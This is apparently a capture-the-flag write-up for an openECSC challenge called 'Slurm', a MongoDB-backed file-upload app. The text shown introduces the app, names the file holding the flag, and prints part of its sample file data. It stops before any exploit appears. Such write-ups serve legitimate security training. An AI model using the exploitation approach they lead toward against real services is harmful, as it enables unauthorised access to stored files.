<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>Slurm</title>
    <meta content="width=device-width, initial-scale=1" name="viewport">
    <link rel="icon" href="../img/logo.svg" type="image/x-icon">
    <style>
[data-color-mode*='light'], [data-color-mode*='light'] body, .markdown-style[theme*='light'] { --color-prettylights-syntax-comment: #6e7781; --color-prettylights-syntax-constant: #0550ae; --color-prettylights-syntax-entity: #8250df; --color-prettylights-syntax-storage-modifier-import: #24292f; --color-prettylights-syntax-entity-tag: #116329; --color-prettylights-syntax-keyword: #cf222e; --color-prettylights-syntax-string: #0a3069; --color-prettylights-syntax-variable: #953800; --color-prettylights-syntax-brackethighlighter-unmatched: #82071e; --color-prettylights-syntax-invalid-illegal-text: #f6f8fa; --color-prettylights-syntax-invalid-illegal-bg: #82071e; --color-prettylights-syntax-carriage-return-text: #f6f8fa; --color-prettylights-syntax-carriage-return-bg: #cf222e; --color-prettylights-syntax-string-regexp: #116329; --color-prettylights-syntax-markup-list: #3b2300; --color-prettylights-syntax-markup-heading: #0550ae; --color-prettylights-syntax-markup-italic: #24292f; --color-prettylights-syntax-markup-bold: #24292f; --color-prettylights-syntax-markup-deleted-text: #82071e; --color-prettylights-syntax-markup-deleted-bg: #FFEBE9; --color-prettylights-syntax-markup-inserted-text: #116329; --color-prettylights-syntax-markup-inserted-bg: #dafbe1; --color-prettylights-syntax-markup-changed-text: #953800; --color-prettylights-syntax-markup-changed-bg: #ffd8b5; --color-prettylights-syntax-markup-ignored-text: #eaeef2; --color-prettylights-syntax-markup-ignored-bg: #0550ae; --color-prettylights-syntax-meta-diff-range: #8250df; --color-prettylights-syntax-brackethighlighter-angle: #57606a; --color-prettylights-syntax-sublimelinter-gutter-mark: #8c959f; --color-prettylights-syntax-constant-other-reference-link: #0a3069; --color-fg-default: #24292f; --color-fg-muted: #57606a; --color-fg-subtle: #6e7781; --color-canvas-default: #ffffff; --color-canvas-subtle: #f6f8fa; --color-border-default: #d0d7de; --color-border-muted: hsla(210,18%,87%,1); --color-neutral-muted: rgba(175,184,193,0.2); --color-accent-fg: #0969da; --color-accent-emphasis: #0969da; --color-attention-subtle: #fff8c5; --color-danger-fg: #cf222e; }
[data-color-mode*='dark'], [data-color-mode*='dark'] body, .markdown-style[theme*='dark'] { --color-prettylights-syntax-comment: #8b949e; --color-prettylights-syntax-constant: #79c0ff; --color-prettylights-syntax-entity: #d2a8ff; --color-prettylights-syntax-storage-modifier-import: #c9d1d9; --color-prettylights-syntax-entity-tag: #7ee787; --color-prettylights-syntax-keyword: #ff7b72; --color-prettylights-syntax-string: #a5d6ff; --color-prettylights-syntax-variable: #ffa657; --color-prettylights-syntax-brackethighlighter-unmatched: #f85149; --color-prettylights-syntax-invalid-illegal-text: #f0f6fc; --color-prettylights-syntax-invalid-illegal-bg: #8e1519; --color-prettylights-syntax-carriage-return-text: #f0f6fc; --color-prettylights-syntax-carriage-return-bg: #b62324; --color-prettylights-syntax-string-regexp: #7ee787; --color-prettylights-syntax-markup-list: #f2cc60; --color-prettylights-syntax-markup-heading: #1f6feb; --color-prettylights-syntax-markup-italic: #c9d1d9; --color-prettylights-syntax-markup-bold: #c9d1d9; --color-prettylights-syntax-markup-deleted-text: #ffdcd7; --color-prettylights-syntax-markup-deleted-bg: #67060c; --color-prettylights-syntax-markup-inserted-text: #aff5b4; --color-prettylights-syntax-markup-inserted-bg: #033a16; --color-prettylights-syntax-markup-changed-text: #ffdfb6; --color-prettylights-syntax-markup-changed-bg: #5a1e02; --color-prettylights-syntax-markup-ignored-text: #c9d1d9; --color-prettylights-syntax-markup-ignored-bg: #1158c7; --color-prettylights-syntax-meta-diff-range: #d2a8ff; --color-prettylights-syntax-brackethighlighter-angle: #8b949e; --color-prettylights-syntax-sublimelinter-gutter-mark: #484f58; --color-prettylights-syntax-constant-other-reference-link: #a5d6ff; --color-fg-default: #c9d1d9; --color-fg-muted: #8b949e; --color-fg-subtle: #484f58; --color-canvas-default: #0d1117; --color-canvas-subtle: #161b22; --color-border-default: #30363d; --color-border-muted: #21262d; --color-neutral-muted: rgba(110,118,129,0.4); --color-accent-fg: #58a6ff; --color-accent-emphasis: #1f6feb; --color-attention-subtle: rgba(187,128,9,0.15); --color-danger-fg: #f85149; }
.markdown-style { display: block; -webkit-text-size-adjust: 100%; font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Helvetica,Arial,sans-serif,"Apple Color Emoji","Segoe UI Emoji"; font-size: 16px; line-height: 1.5; word-wrap: break-word; color: var(--color-fg-default); background-color: var(--color-canvas-default); } .markdown-style details, .markdown-style figcaption, .markdown-style figure { display: block; } .markdown-style summary { display: list-item; } .markdown-style [hidden] { display: none !important; } .markdown-style a { background-color: transparent; color: var(--color-accent-fg); text-decoration: none; } .markdown-style a:active, .markdown-style a:hover { outline-width: 0; } .markdown-style abbr[title] { border-bottom: none; text-decoration: underline dotted; } .markdown-style b, .markdown-style strong { font-weight: 600; } .markdown-style dfn { font-style: italic; } .markdown-style h1 { margin: .67em 0; font-weight: 600; padding-bottom: .3em; font-size: 2em; border-bottom: 1px solid var(--color-border-muted); } .markdown-style mark { background-color: var(--color-attention-subtle); color: var(--color-text-primary); } .markdown-style small { font-size: 90%; } .markdown-style sub, .markdown-style sup { font-size: 75%; line-height: 0; position: relative; vertical-align: baseline; } .markdown-style sub { bottom: -0.25em; } .markdown-style sup { top: -0.5em; } .markdown-style img { border-style: none; max-width: 100%; box-sizing: content-box; background-color: var(--color-canvas-default); } .markdown-style code, .markdown-style kbd, .markdown-style pre, .markdown-style samp { font-family: monospace,monospace; font-size: 1em; } .markdown-style figure { margin: 1em 40px; } .markdown-style hr { box-sizing: content-box; overflow: hidden; background: transparent; border-bottom: 1px solid var(--color-border-muted); height: .25em; padding: 0; margin: 24px 0; background-color: var(--color-border-default); border: 0; } .markdown-style input { font: inherit; margin: 0; overflow: visible; font-family: inherit; font-size: inherit; line-height: inherit; } .markdown-style [type=button], .markdown-style [type=reset], .markdown-style [type=submit] { -webkit-appearance: button; } .markdown-style [type=button]::-moz-focus-inner, .markdown-style [type=reset]::-moz-focus-inner, .markdown-style [type=submit]::-moz-focus-inner { border-style: none; padding: 0; } .markdown-style [type=button]:-moz-focusring, .markdown-style [type=reset]:-moz-focusring, .markdown-style [type=submit]:-moz-focusring { outline: 1px dotted ButtonText; } .markdown-style [type=checkbox], .markdown-style [type=radio] { box-sizing: border-box; padding: 0; } .markdown-style [type=number]::-webkit-inner-spin-button, .markdown-style [type=number]::-webkit-outer-spin-button { height: auto; } .markdown-style [type=search] { -webkit-appearance: textfield; outline-offset: -2px; } .markdown-style [type=search]::-webkit-search-cancel-button, .markdown-style [type=search]::-webkit-search-decoration { -webkit-appearance: none; } .markdown-style ::-webkit-input-placeholder { color: inherit; opacity: .54; } .markdown-style ::-webkit-file-upload-button { -webkit-appearance: button; font: inherit; } .markdown-style a:hover { text-decoration: underline; } .markdown-style hr::before { display: table; content: ""; } .markdown-style hr::after { display: table; clear: both; content: ""; } .markdown-style table { border-spacing: 0; border-collapse: collapse; display: block; width: max-content; max-width: 100%; overflow: auto; } .markdown-style td, .markdown-style th { padding: 0; } .markdown-style details summary { cursor: pointer; } .markdown-style details:not([open])>*:not(summary) { display: none !important; } .markdown-style kbd { display: inline-block; padding: 3px 5px; font: 11px ui-monospace,SFMono-Regular,SF Mono,Menlo,Consolas,Liberation Mono,monospace; line-height: 10px; color: var(--color-fg-default); vertical-align: middle; background-color: var(--color-canvas-subtle); border: solid 1px var(--color-neutral-muted); border-bottom-color: var(--color-neutral-muted); border-radius: 6px; box-shadow: inset 0 -1px 0 var(--color-neutral-muted); } .markdown-style h1, .markdown-style h2, .markdown-style h3, .markdown-style h4, .markdown-style h5, .markdown-style h6 { margin-top: 24px; margin-bottom: 16px; font-weight: 600; line-height: 1.25; } .markdown-style h2 { font-weight: 600; padding-bottom: .3em; font-size: 1.5em; border-bottom: 1px solid var(--color-border-muted); } .markdown-style h3 { font-weight: 600; font-size: 1.25em; } .markdown-style h4 { font-weight: 600; font-size: 1em; } .markdown-style h5 { font-weight: 600; font-size: .875em; } .markdown-style h6 { font-weight: 600; font-size: .85em; color: var(--color-fg-muted); } .markdown-style p { margin-top: 0; margin-bottom: 10px; } .markdown-style blockquote { margin: 0; padding: 0 1em; color: var(--color-fg-muted); border-left: .25em solid var(--color-border-default); } .markdown-style ul, .markdown-style ol { margin-top: 0; margin-bottom: 0; padding-left: 2em; } .markdown-style ol ol, .markdown-style ul ol { list-style-type: lower-roman; } .markdown-style ul ul ol, .markdown-style ul ol ol, .markdown-style ol ul ol, .markdown-style ol ol ol { list-style-type: lower-alpha; } .markdown-style dd { margin-left: 0; } .markdown-style tt, .markdown-style code { font-family: ui-monospace,SFMono-Regular,SF Mono,Menlo,Consolas,Liberation Mono,monospace; font-size: 12px; } .markdown-style pre { margin-top: 0; margin-bottom: 0; font-family: ui-monospace,SFMono-Regular,SF Mono,Menlo,Consolas,Liberation Mono,monospace; font-size: 12px; word-wrap: normal; } .markdown-style .octicon { display: inline-block; overflow: visible !important; vertical-align: text-bottom; fill: currentColor; } .markdown-style ::placeholder { color: var(--color-fg-subtle); opacity: 1; } .markdown-style input::-webkit-outer-spin-button, .markdown-style input::-webkit-inner-spin-button { margin: 0; -webkit-appearance: none; appearance: none; }
.markdown-style .token.comment, .markdown-style .token.prolog, .markdown-style .token.doctype, .markdown-style .token.cdata { color: var(--color-prettylights-syntax-comment); } .markdown-style .token.namespace { opacity: 0.7; } .markdown-style .token.tag, .markdown-style .token.selector, .markdown-style .token.constant, .markdown-style .token.symbol, .markdown-style .token.deleted { color: var(--color-prettylights-syntax-entity-tag); } .markdown-style .token.maybe-class-name { color: var(--color-prettylights-syntax-variable); } .markdown-style .token.property-access, .markdown-style .token.operator, .markdown-style .token.boolean, .markdown-style .token.number, .markdown-style .token.selector .markdown-style .token.class, .markdown-style .token.attr-name, .markdown-style .token.string, .markdown-style .token.char, .markdown-style .token.builtin { color: var(--color-prettylights-syntax-constant); } .markdown-style .token.deleted { color: var(--color-prettylights-syntax-markup-deleted-text); } .markdown-style .token.property { color: var(--color-prettylights-syntax-constant); } .markdown-style .token.punctuation { color: var(--color-prettylights-syntax-markup-bold); } .markdown-style .token.function { color: var(--color-prettylights-syntax-entity); } .markdown-style .code-line .token.deleted { background-color: var(--color-prettylights-syntax-markup-deleted-bg); } .markdown-style .token.inserted { color: var(--color-prettylights-syntax-markup-inserted-text); } .markdown-style .code-line .token.inserted { background-color: var(--color-prettylights-syntax-markup-inserted-bg); } .markdown-style .token.variable { color: var(--color-prettylights-syntax-constant); } .markdown-style .token.entity, .markdown-style .token.url, .language-css .markdown-style .token.string, .style .markdown-style .token.string { color: var(--color-prettylights-syntax-string); } .markdown-style .token.color, .markdown-style .token.atrule, .markdown-style .token.attr-value, .markdown-style .token.function, .markdown-style .token.class-name { color: var(--color-prettylights-syntax-string); } .markdown-style .token.rule, .markdown-style .token.regex, .markdown-style .token.important, .markdown-style .token.keyword { color: var(--color-prettylights-syntax-keyword); } .markdown-style .token.coord { color: var(--color-prettylights-syntax-meta-diff-range); } .markdown-style .token.important, .markdown-style .token.bold { font-weight: bold; } .markdown-style .token.italic { font-style: italic; } .markdown-style .token.entity { cursor: help; }
.markdown-style [data-catalyst] { display: block; } .markdown-style g-emoji { font-family: "Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol"; font-size: 1em; font-style: normal !important; font-weight: 400; line-height: 1; vertical-align: -0.075em; } .markdown-style g-emoji img { width: 1em; height: 1em; } .markdown-style::before { display: table; content: ""; } .markdown-style::after { display: table; clear: both; content: ""; } .markdown-style>*:first-child { margin-top: 0 !important; } .markdown-style>*:last-child { margin-bottom: 0 !important; } .markdown-style a:not([href]) { color: inherit; text-decoration: none; } .markdown-style .absent { color: var(--color-danger-fg); } .markdown-style a.anchor { float: left; padding-right: 4px; margin-left: -20px; line-height: 1; } .markdown-style a.anchor:focus { outline: none; } .markdown-style p, .markdown-style blockquote, .markdown-style ul, .markdown-style ol, .markdown-style dl, .markdown-style table, .markdown-style pre, .markdown-style details { margin-top: 0; margin-bottom: 16px; } .markdown-style blockquote>:first-child { margin-top: 0; } .markdown-style blockquote>:last-child { margin-bottom: 0; } .markdown-style sup>a::before { content: "["; } .markdown-style sup>a::after { content: "]"; }
.markdown-style .octicon-video { border: 1px solid #d0d7de !important; border-radius: 6px !important; display: block; } .markdown-style .octicon-video summary { border-bottom: 1px solid #d0d7de !important; padding: 8px 16px !important; cursor: pointer; } .markdown-style .octicon-video > video { display: block !important; max-width: 100% !important; padding: 2px; box-sizing: border-box; border-bottom-right-radius: 6px !important; border-bottom-left-radius: 6px !important; } .markdown-style details.octicon-video:not([open])>*:not(summary) { display: none !important; } .markdown-style details.octicon-video:not([open]) > summary { border-bottom: 0 !important; } .markdown-style h1 .octicon-link, .markdown-style h2 .octicon-link, .markdown-style h3 .octicon-link, .markdown-style h4 .octicon-link, .markdown-style h5 .octicon-link, .markdown-style h6 .octicon-link { color: var(--color-fg-default); vertical-align: middle; visibility: hidden; } .markdown-style h1:hover .anchor, .markdown-style h2:hover .anchor, .markdown-style h3:hover .anchor, .markdown-style h4:hover .anchor, .markdown-style h5:hover .anchor, .markdown-style h6:hover .anchor { text-decoration: none; } .markdown-style h1:hover .anchor .octicon-link, .markdown-style h2:hover .anchor .octicon-link, .markdown-style h3:hover .anchor .octicon-link, .markdown-style h4:hover .anchor .octicon-link, .markdown-style h5:hover .anchor .octicon-link, .markdown-style h6:hover .anchor .octicon-link { visibility: visible; } .markdown-style h1 tt, .markdown-style h1 code, .markdown-style h2 tt, .markdown-style h2 code, .markdown-style h3 tt, .markdown-style h3 code, .markdown-style h4 tt, .markdown-style h4 code, .markdown-style h5 tt, .markdown-style h5 code, .markdown-style h6 tt, .markdown-style h6 code { padding: 0 .2em; font-size: inherit; } .markdown-style ul.no-list, .markdown-style ol.no-list { padding: 0; list-style-type: none; } .markdown-style ol[type="1"] { list-style-type: decimal; } .markdown-style ol[type=a] { list-style-type: lower-alpha; } .markdown-style ol[type=i] { list-style-type: lower-roman; } .markdown-style div>ol:not([type]) { list-style-type: decimal; } .markdown-style ul ul, .markdown-style ul ol, .markdown-style ol ol, .markdown-style ol ul { margin-top: 0; margin-bottom: 0; } .markdown-style li>p { margin-top: 16px; } .markdown-style li+li { margin-top: .25em; } .markdown-style dl { padding: 0; } .markdown-style dl dt { padding: 0; margin-top: 16px; font-size: 1em; font-style: italic; font-weight: 600; } .markdown-style dl dd { padding: 0 16px; margin-bottom: 16px; } .markdown-style table th { font-weight: 600; } .markdown-style table th, .markdown-style table td { padding: 6px 13px; border: 1px solid var(--color-border-default); } .markdown-style table tr { background-color: var(--color-canvas-default); border-top: 1px solid var(--color-border-muted); } .markdown-style table tr:nth-child(2n) { background-color: var(--color-canvas-subtle); } .markdown-style table img { background-color: transparent; vertical-align: middle; } .markdown-style img[align=right] { padding-left: 20px; } .markdown-style img[align=left] { padding-right: 20px; } .markdown-style .emoji { max-width: none; vertical-align: text-top; background-color: transparent; } .markdown-style span.frame { display: block; overflow: hidden; } .markdown-style span.frame>span { display: block; float: left; width: auto; padding: 7px; margin: 13px 0 0; overflow: hidden; border: 1px solid var(--color-border-default); } .markdown-style span.frame span img { display: block; float: left; } .markdown-style span.frame span span { display: block; padding: 5px 0 0; clear: both; color: var(--color-fg-default); } .markdown-style span.align-center { display: block; overflow: hidden; clear: both; } .markdown-style span.align-center>span { display: block; margin: 13px auto 0; overflow: hidden; text-align: center; } .markdown-style span.align-center span img { margin: 0 auto; text-align: center; } .markdown-style span.align-right { display: block; overflow: hidden; clear: both; } .markdown-style span.align-right>span { display: block; margin: 13px 0 0; overflow: hidden; text-align: right; } .markdown-style span.align-right span img { margin: 0; text-align: right; } .markdown-style span.float-left { display: block; float: left; margin-right: 13px; overflow: hidden; } .markdown-style span.float-left span { margin: 13px 0 0; } .markdown-style span.float-right { display: block; float: right; margin-left: 13px; overflow: hidden; } .markdown-style span.float-right>span { display: block; margin: 13px auto 0; overflow: hidden; text-align: right; } .markdown-style code, .markdown-style tt { padding: .2em .4em; margin: 0; font-size: 85%; background-color: var(--color-neutral-muted); border-radius: 6px; } .markdown-style code br, .markdown-style tt br { display: none; } .markdown-style del code { text-decoration: inherit; } .markdown-style pre code { font-size: 100%; } .markdown-style pre>code { padding: 0; margin: 0; word-break: normal; white-space: pre; background: transparent; border: 0; } .markdown-style pre { position: relative; font-size: 85%; line-height: 1.45; background-color: var(--color-canvas-subtle); border-radius: 6px; } .markdown-style pre code, .markdown-style pre tt { display: inline; max-width: auto; padding: 0; margin: 0; overflow: visible; line-height: inherit; word-wrap: normal; background-color: transparent; border: 0; } .markdown-style pre > code { padding: 16px; overflow: auto; display: block; } .markdown-style .csv-data td, .markdown-style .csv-data th { padding: 5px; overflow: hidden; font-size: 12px; line-height: 1; text-align: left; white-space: nowrap; } .markdown-style .csv-data .blob-num { padding: 10px 8px 9px; text-align: right; background: var(--color-canvas-default); border: 0; } .markdown-style .csv-data tr { border-top: 0; } .markdown-style .csv-data th { font-weight: 600; background: var(--color-canvas-subtle); border-top: 0; } .markdown-style .footnotes { font-size: 12px; color: var(--color-fg-muted); border-top: 1px solid var(--color-border-default); } .markdown-style .footnotes ol { padding-left: 16px; } .markdown-style .footnotes li { position: relative; } .markdown-style .footnotes li:target::before { position: absolute; top: -8px; right: -8px; bottom: -8px; left: -24px; pointer-events: none; content: ""; border: 2px solid var(--color-accent-emphasis); border-radius: 6px; } .markdown-style .footnotes li:target { color: var(--color-fg-default); } .markdown-style .footnotes .data-footnote-backref g-emoji { font-family: monospace; } .markdown-style .task-list-item { list-style-type: none; } .markdown-style .task-list-item label { font-weight: 400; } .markdown-style .task-list-item.enabled label { cursor: pointer; } .markdown-style .task-list-item+.task-list-item { margin-top: 3px; } .markdown-style .task-list-item .handle { display: none; } .markdown-style .task-list-item-checkbox, .markdown-style input[type="checkbox"] { margin: 0 .2em .25em -1.6em; vertical-align: middle; } .markdown-style .contains-task-list:dir(rtl) .task-list-item-checkbox, .markdown-style .contains-task-list:dir(rtl) input[type="checkbox"] { margin: 0 -1.6em .25em .2em; } .markdown-style ::-webkit-calendar-picker-indicator { filter: invert(50%); }

/** copy button style **/
.markdown-style pre .copied {
  display: flex;
  position: absolute;
  cursor: pointer;
  color: #a5afbb;
  top: 6px;
  right: 6px;
  border-radius: 5px;
  background: #82828226;
  padding: 6px;
  font-size: 12px;
  transition: all .3s;
}
.markdown-style pre .copied:not(.active) { visibility: hidden; }
.markdown-style pre:hover .copied { visibility: visible; }
.markdown-style pre:hover .copied:hover { background: #4caf50; color: #fff; }
.markdown-style pre:hover .copied:active,
.markdown-style pre .copied.active { background: #2e9b33; color: #fff; }
.markdown-style pre .copied svg { position: relative; }
.markdown-style pre .copied .octicon-copy { display: block; }
.markdown-style pre .copied .octicon-check { display: none; }
.markdown-style pre .active .octicon-copy { display: none; }
.markdown-style pre .active .octicon-check { display: block; }

/** octicon style **/
.markdown-style h1:hover a.anchor .octicon-link:before,
.markdown-style h2:hover a.anchor .octicon-link:before,
.markdown-style h3:hover a.anchor .octicon-link:before,
.markdown-style h4:hover a.anchor .octicon-link:before,
.markdown-style h5:hover a.anchor .octicon-link:before,
.markdown-style h6:hover a.anchor .octicon-link:before {
  width: 16px;
  height: 16px;
  content: ' ';
  display: inline-block;
  background-color: currentColor;
  -webkit-mask-image: url("data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16' version='1.1' aria-hidden='true'><path fill-rule='evenodd' d='M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z'></path></svg>");
  mask-image: url("data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16' version='1.1' aria-hidden='true'><path fill-rule='evenodd' d='M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z'></path></svg>");
}

.markdown-style ::-webkit-scrollbar {
  background: transparent;
  width: 8px;
  height: 8px;
}

.markdown-style ::-webkit-scrollbar-thumb {
  background: var(--color-fg-muted);
  border-radius: 10px;
}
</style>
  </head>
  <body><dark-mode style="position: fixed; top: 8px; left: 10px; z-index: 999;" dark="Dark" light="Light" permanent="true"></dark-mode><script>const t=document;const e="_dark_mode_theme_";const s="permanent";const o="colorschemechange";const i="permanentcolorscheme";const h="light";const r="dark";const n=(t,e,s=e)=>{Object.defineProperty(t,s,{enumerable:true,get(){const t=this.getAttribute(e);return t===null?"":t},set(t){this.setAttribute(e,t)}})};const c=(t,e,s=e)=>{Object.defineProperty(t,s,{enumerable:true,get(){return this.hasAttribute(e)},set(t){if(t){this.setAttribute(e,"")}else{this.removeAttribute(e)}}})};class a extends HTMLElement{static get observedAttributes(){return["mode",h,r,s]}LOCAL_NANE=e;constructor(){super();this.t()}connectedCallback(){n(this,"mode");n(this,r);n(this,h);c(this,s);const a=localStorage.getItem(e);if(a&&[h,r].includes(a)){this.mode=a;this.permanent=true}if(this.permanent&&!a){localStorage.setItem(e,this.mode)}const l=[h,r].includes(a);if(this.permanent&&a){this.o()}else{if(window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches){this.mode=r;this.o()}if(window.matchMedia&&window.matchMedia("(prefers-color-scheme: light)").matches){this.mode=h;this.o()}}if(!this.permanent&&!l){window.matchMedia("(prefers-color-scheme: light)").onchange=t=>{this.mode=t.matches?h:r;this.o()};window.matchMedia("(prefers-color-scheme: dark)").onchange=t=>{this.mode=t.matches?r:h;this.o()}}const d=new MutationObserver(((s,h)=>{this.mode=t.documentElement.dataset.colorMode;if(this.permanent&&l){localStorage.setItem(e,this.mode);this.i(i,{permanent:this.permanent})}this.h();this.i(o,{colorScheme:this.mode})}));d.observe(t.documentElement,{attributes:true});this.i(o,{colorScheme:this.mode});this.h()}attributeChangedCallback(t,s,o){if(t==="mode"&&s!==o&&[h,r].includes(o)){const t=localStorage.getItem(e);if(this.mode===t){this.mode=o;this.h();this.o()}else if(this.mode&&this.mode!==t){this.h();this.o()}}else if((t===h||t===r)&&s!==o){this.h()}if(t==="permanent"&&typeof this.permanent==="boolean"){this.permanent?localStorage.setItem(e,this.mode):localStorage.removeItem(e)}}o(){t.documentElement.setAttribute("data-color-mode",this.mode)}h(){this.icon.textContent=this.mode===h?"ðŸŒ’":"ðŸŒž";this.text.textContent=this.mode===h?this.getAttribute(r):this.getAttribute(h);if(!this.text.textContent&&this.text.parentElement&&this.text){this.text.parentElement.removeChild(this.text)}}t(){var s=this.attachShadow({mode:"open"});this.label=t.createElement("span");this.label.setAttribute("class","wrapper");this.label.onclick=()=>{this.mode=this.mode===h?r:h;if(this.permanent){localStorage.setItem(e,this.mode)}this.o();this.h()};s.appendChild(this.label);this.icon=t.createElement("span");this.icon.part="icon";this.label.appendChild(this.icon);this.text=t.createElement("span");this.text.part="text";this.label.appendChild(this.text);const o=`
[data-color-mode*='dark'], [data-color-mode*='dark'] body {
  color-scheme: dark;
  --color-theme-bg: #0d1117;
  --color-theme-text: #c9d1d9;
  background-color: var(--color-theme-bg);
  color: var(--color-theme-text);
}

[data-color-mode*='light'], [data-color-mode*='light'] body {
  color-scheme: light;
  --color-theme-bg: #fff;
  --color-theme-text: #24292f;
  background-color: var(--color-theme-bg);
  color: var(--color-theme-text);
}`;const i="_dark_mode_style_";const n=t.getElementById(i);if(!n){var c=t.createElement("style");c.id=i;c.textContent=o;t.head.appendChild(c)}var a=t.createElement("style");a.textContent=`
    .wrapper { cursor: pointer; user-select: none; position: relative; }
    .wrapper > span + span { margin-left: .4rem; }
    `;s.appendChild(a)}i(t,e){this.dispatchEvent(new CustomEvent(t,{bubbles:true,composed:true,detail:e}))}}customElements.define("dark-mode",a);</script><div style="max-width: 960px; margin: 0 auto 60px auto; padding: 8px;max-width: 960px;" class="markdown-style">
    <h1 id="introduction"><a class="anchor" aria-hidden="true" tabindex="-1" href="#introduction"><span class="octicon octicon-link"></span></a>Introduction</h1>
    <p>The challenge consists in a basic file upload functionality, as well as having some uploaded files of its own, it uses MongoDB to keep track of which files exist and where and it also has the functionality to get the checksum of a specific file to verify the integrity of it.</p>
    <p>
      <img src="images/20240921-openecsc-final-round-slurm/slurm.png" alt="alt text">
    </p>
    <h1 id="source-code-analysis"><a class="anchor" aria-hidden="true" tabindex="-1" href="#source-code-analysis"><span class="octicon octicon-link"></span></a>Source Code Analysis</h1>
    <p>After checking out the app source code, we see that the flag is stored inside the file <code>secretrecipe.txt</code> having <code>ea41c85c-3db0-4ded-aff1-a93994f64d81</code> as its file id.</p>
    <pre class="language-python"><code class="language-python code-highlight"><span class="code-line line-number" line="1">files <span class="token operator">=</span> <span class="token punctuation">[</span>
</span><span class="code-line line-number" line="2">    <span class="token punctuation">{</span>
</span><span class="code-line line-number" line="3">        <span class="token string">"metadata"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>
</span><span class="code-line line-number" line="4">            <span class="token string">"author"</span><span class="token punctuation">:</span> <span class="token string">"Slurm Mckenzie"</span><span class="token punctuation">,</span>
</span><span class="code-line line-number" line="5">            <span class="token string">"filename"</span><span class="token punctuation">:</span> <span class="token string">"whytodrinkslurm.txt"</span><span class="token punctuation">,</span>
</span><span class="code-line line-number" line="6">            <span class="token string">"description"</span><span class="token punctuation">:</span> <span class="token string">"Discover why to drink our awesome slurm"</span><span class="token punctuation">,</span>
</span><span class="code-line line-number" line="7">            <span class="token string">"id"</span><span class="token punctuation">:</span> <span class="token string">"e7bfd133-9fe0-4b9b-94bc-2857f92bd13b"</span><span class="token punctuation">,</span>
</span><span class="code-line line-number" line="8">        <span class="token punctuation">}</span><span class="token punctuation">,</span>
</span><span class="code-line line-number" line="9">        <span class="token string">"content"</span><span class="token punctuation">:</span> <span class="token string">"The most addictive drink ever!"</span><span class="token punctuation">,</span>
</span><span class="code-line line-number" line="10">    <span class="token punctuation">}</span><span class="token punctuation">,</span>
</span><span class="code-line line-number" line="11">    <span class="token punctuation">{</span>
</span><span class="code-line line-number" line="12">        <span class="token string">"metadata"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>
</span><span class="code-line line-number" line="13">            <span class="token string">"author"</span><span class="token punctuation">:</span> <span class="token string">"Slurm Mckenzie"</span><span class="token punctuation">,</span>
</span><span class="code-line line-number" line="14">            <span class="token string">"filename"</span><span class="token punctuation">:</span> <span class="token string">"aboutingredients.txt"</span><span class="token punctuation">,</span>
</span><span class="code-line line-number" line="15">            <span class="token string">"description"</span><span class="token punctuation">:</span> <span class="token string">"Some good news about our ingredients"</span><span class="token punctuation">,</span>
</span><span class="code-line line-number" line="16">            <span class="token string">"id"</span><span class="token punctuation">:</span> <span class="token string">"1e8f1948-4f3b-4a33-8be6-e6938efdfabc"</span><span class="token punctuation">,</span>
</span><span class="code-line line-number" line="17">        <span class="token punctuation">}</span><span class="token punctuation">,</span>
</span><span class="code-line line-number" line="18">        <span class="token string">"content"</span><span class="token punctuation">:</span> <span class="token string">"Bio ingredients, all natural stuffs."</span><span class="token punctuation">,</span>
</span><span class="code-line line-number" line="19">    <span class="token punctuation">}</span><span class="token punctuation">,</span>
</span><span class="code-line line-number" line="20">    <span class="token punctuation">{</span>
</span><span class="code-line line-number" line="21">        <span class="token string">"metadata"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>
</span><span class="code-line line-number" line="22">            <span class="token string">"author"</span><span class="token punctuation">:</span> <span class="token string">"Slurm Mckenzie"</span><span class="token punctuation">,</span>
</span><span class="code-line line-number" line="23">            <span class="token string">"filename"</span><span class="token punctuation">:</span> <span class="token string">"healthydrink.txt"</span><span class="token punctuation">,</span>
</span><span class="code-line line-number" line="24">            <span class="token string">"description"</span><span class="token punctuation">:</span> <span class="token string">"Our drink is healty"</span><span class="token punctuation">,</span>
</span><span class="code-line line-number" line="25">            <span class="token string">"id"</span><span class="token punctuation">:</span> <span class="token string">"50fca9e8-2619-43b8-b84b-a555bf48e2c5"</span><span class="token punctuation">,</span>
</span><span class="code-line line-number" line="26">        <span class="token punctuation">}</span><span class="token punctuation">,</span>
</span><span class="code-line line-number" line="27">        <span class="token string">"content"</span><span class="token punctuation">:</span> <span class="token string">"Refill your energy and take care about your weight and your health with slurm!"</span><span class="token punctuation">,</span>
</span><span class="code-line line-number" line="28">    <span class="token punctuation">}</span><span class="token punctuation">,</span>
</span><span class="code-line line-number" line="29">    <span class="token punctuation">{</span>
</span><span class="code-line line-number" line="30">        <span class="token string">"metadata"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>
</span><span class="code-line line-number" line="31">            <span class="token string">"author"</span><span class="token punctuation">:</span> <span class="token string">"Slurm Queen"</span><span class="token punctuation">,</span>
